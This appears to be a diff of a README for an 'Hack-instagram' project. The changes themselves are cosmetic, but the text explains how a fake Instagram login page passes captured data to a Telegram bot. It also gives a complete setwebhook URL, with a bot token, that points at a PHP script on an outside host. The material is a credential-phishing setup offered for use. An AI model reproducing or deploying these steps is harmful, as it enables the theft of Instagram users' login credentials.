@@ -1,8 +1,9 @@
 # Hack-instagram
 ` By >_/Recoded*** Programmer();`
+-----------
 `object` Login send __Website__ to Bot in `Telegram`
 
-Bit Information Get __Hacking__ *instagram*
+Bot Information Get __Hacking__ *instagram*
 ----------
 
 
@@ -16,11 +17,11 @@ https://api.telegram.org/bot
 
 /setwebhook?url= file link
 
-Like this... 🤦🏼‍♂🌝
+Like this... 
 
 https://api.telegram.org/bot394604313:AAHa9kRzybPoJoLMx6vFqY-k/setwebhook?url=https://Recoded.HOST.com/insta.php
 
-And Enjoy Time ⛑🤦🏼‍♂
+And Enjoy your Time...();
 ```
 
 ---------
